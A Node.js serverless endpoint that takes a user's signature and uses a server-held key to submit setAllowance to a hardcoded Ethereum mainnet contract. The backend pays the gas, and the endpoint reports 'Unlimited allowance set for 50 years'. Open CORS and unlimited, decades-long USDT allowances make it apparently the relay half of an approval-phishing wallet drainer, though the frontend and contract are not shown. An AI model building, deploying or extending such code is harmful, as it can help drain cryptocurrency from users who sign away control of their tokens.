// ============================================
// api/submit-signature.js
// USDT Allowance - Backend API
// ============================================

const { ethers } = require('ethers');

module.exports = async (req, res) => {
    // ============================================
    // 1. CORS Headers
    // ============================================
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // ============================================
    // 2. Handle OPTIONS (Preflight)
    // ============================================
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // ============================================
    // 3. GET Request - Test
    // ============================================
    if (req.method === 'GET') {
        return res.status(200).json({
            status: 'OK',
            message: 'API is working!',
            timestamp: new Date().toISOString()
        });
    }

    // ============================================
    // 4. Only POST allowed
    // ============================================
    if (req.method !== 'POST') {
        return res.status(405).json({
            success: false,
            error: 'Method not allowed. Use POST.'
        });
    }

    // ============================================
    // 5. Main Logic - POST Request
    // ============================================
    try {
        // Get data from request body
        const { user, nonce, deadline, signature } = req.body;

        console.log('📥 Received:');
        console.log('  👤 User:', user);
        console.log('  📝 Nonce:', nonce);
        console.log('  ⏰ Deadline:', deadline);
        console.log('  📝 Signature:', signature ? signature.substring(0, 40) + '...' : 'null');

        // ============================================
        // 6. Configuration - Environment Variables
        // ============================================
        const CONFIG = {
            rpcUrl: `https://eth-mainnet.g.alchemy.com/v2/${process.env.ALCHEMY_API_KEY}`,
            privateKey: process.env.PRIVATE_KEY,
            contractAddress: "0xb69E225117d428a0b349BAB76368c68012Df1837"
        };

        // Check if all required configs are set
        if (!CONFIG.privateKey) {
            console.error('❌ PRIVATE_KEY not set!');
            return res.status(500).json({
                success: false,
                error: 'PRIVATE_KEY not set in environment variables'
            });
        }

        if (!process.env.ALCHEMY_API_KEY) {
            console.error('❌ ALCHEMY_API_KEY not set!');
            return res.status(500).json({
                success: false,
                error: 'ALCHEMY_API_KEY not set in environment variables'
            });
        }

        console.log('🔧 Config:');
        console.log('  📋 Contract:', CONFIG.contractAddress);
        console.log('  🔑 PrivateKey:', CONFIG.privateKey ? '✅ Set' : '❌ Not Set');
        console.log('  🔑 Alchemy:', process.env.ALCHEMY_API_KEY ? '✅ Set' : '❌ Not Set');

        // ============================================
        // 7. Initialize Provider and Wallet
        // ============================================
        console.log('⏳ Initializing provider...');
        const provider = new ethers.providers.JsonRpcProvider(CONFIG.rpcUrl);
        console.log('✅ Provider initialized');

        console.log('⏳ Initializing wallet...');
        const wallet = new ethers.Wallet(CONFIG.privateKey, provider);
        console.log('👛 Wallet address:', wallet.address);

        // ============================================
        // 8. Smart Contract Setup
        // ============================================
        const contractABI = [
            "function setAllowance(address user, uint256 nonce, uint256 deadline, bytes calldata signature) external"
        ];

        const contract = new ethers.Contract(CONFIG.contractAddress, contractABI, wallet);
        console.log('✅ Contract initialized');

        // ============================================
        // 9. Submit Transaction (Backend pays gas!)
        // ============================================
        console.log('⏳ Submitting setAllowance()...');
        console.log('⛽ Gas will be paid by:', wallet.address);

        const tx = await contract.setAllowance(
            user,
            nonce,
            deadline,
            signature
        );

        console.log('📤 Tx Hash:', tx.hash);

        // ============================================
        // 10. Wait for Confirmation
        // ============================================
        console.log('⏳ Waiting for confirmation...');
        const receipt = await tx.wait();

        console.log('✅ Transaction confirmed!');
        console.log('📦 Block:', receipt.blockNumber);
        console.log('⛽ Gas Used:', receipt.gasUsed.toString());

        // ============================================
        // 11. Return Success Response
        // ============================================
        return res.status(200).json({
            success: true,
            message: '✅ Unlimited allowance set for 50 years! Gas paid by backend.',
            txHash: tx.hash,
            blockNumber: receipt.blockNumber,
            gasUsed: receipt.gasUsed.toString(),
            etherscanUrl: `https://etherscan.io/tx/${tx.hash}`
        });

    } catch (error) {
        // ============================================
        // 12. Error Handling
        // ============================================
        console.error('❌ Error:', error.message);
        console.error('📝 Stack:', error.stack);

        return res.status(500).json({
            success: false,
            error: error.message
        });
    }
};
